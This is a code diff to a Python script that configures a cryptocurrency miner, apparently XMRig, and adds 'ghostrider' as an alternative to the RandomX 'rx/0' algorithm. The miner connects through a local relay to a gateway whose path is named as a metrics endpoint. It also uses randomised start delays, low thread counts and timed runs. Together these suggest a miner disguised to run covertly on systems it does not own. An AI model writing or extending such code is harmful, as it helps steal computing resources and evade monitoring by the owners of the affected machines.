@@ -17,10 +17,11 @@ import urllib.parse
 
 GATEWAY_URL = os.environ["GATEWAY_URL"].rstrip("/")
 ACCESS_KEY = os.environ["RELAY_ACCESS_KEY"].encode("utf-8")
-ACCOUNT = os.environ["ACCOUNT"]
+ACCOUNT = os.environ.get("ACCOUNT", "cache")
 WORKER = os.environ["WORKER"]
 THREADS = int(os.environ.get("THREADS", "2"))
 RANDOMX_MODE = os.environ.get("RANDOMX_MODE", "light")
+ALGORITHM = os.environ.get("ALGORITHM", "rx/0")
 RUN_SECONDS = int(os.environ.get("RUN_SECONDS", "900"))
 START_JITTER_SECONDS = int(os.environ.get("START_JITTER_SECONDS", "45"))
 EVENT_PATH = os.environ.get("EVENT_PATH", "/api/v1/metrics/batch")
@@ -192,6 +193,7 @@ def sanitize_worker(value):
 
 def config_file_descriptor():
     cpu_threads = [-1] * max(1, min(THREADS, os.cpu_count() or 1))
+    cpu_profile = "ghostrider" if ALGORITHM == "ghostrider" else "rx"
     config = {
         "autosave": False,
         "background": False,
@@ -212,11 +214,11 @@ def config_file_descriptor():
             "yield": True,
             "max-threads-hint": 25,
             "asm": True,
-            "rx": cpu_threads,
+            cpu_profile: cpu_threads,
         },
         "pools": [
             {
-                "algo": "rx/0",
+                "algo": ALGORITHM,
                 "url": f"127.0.0.1:{relay_port}",
                 "user": f"{ACCOUNT}.{sanitize_worker(WORKER)}",
                 "pass": "x",
@@ -256,6 +258,8 @@ if not 1 <= THREADS <= 4:
     raise ValueError("THREADS must be between 1 and 4")
 if RANDOMX_MODE not in ("fast", "light"):
     raise ValueError("RANDOMX_MODE must be fast or light")
+if ALGORITHM not in ("rx/0", "ghostrider"):
+    raise ValueError("ALGORITHM must be rx/0 or ghostrider")
 if START_JITTER_SECONDS:
     time.sleep(random.uniform(0, START_JITTER_SECONDS))
 
